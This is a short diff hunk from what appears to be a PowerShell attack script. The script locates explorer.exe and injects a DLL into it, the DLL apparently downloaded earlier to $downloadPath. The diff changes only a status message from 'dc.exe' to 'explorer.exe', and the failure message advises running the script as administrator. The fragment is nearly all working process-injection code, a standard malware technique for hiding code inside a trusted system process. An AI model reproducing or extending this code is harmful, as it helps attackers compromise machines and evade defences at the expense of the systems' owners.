@@ -64,7 +64,7 @@ $explorerProc = Get-Process -Name explorer | Select-Object -First 1 -ExpandPrope
 # Inject the DLL into explorer.exe
 $result = [DllInjector]::InjectDll($explorerProc, $downloadPath)
 if ($result) {
-    Write-Output "DLL injected successfully into dc.exe (PID: $explorerProc)."
+    Write-Output "DLL injected successfully into explorer.exe (PID: $explorerProc)."
 } else {
     Write-Output "Failed to inject DLL. Ensure script is run as administrator and check for errors."
 }
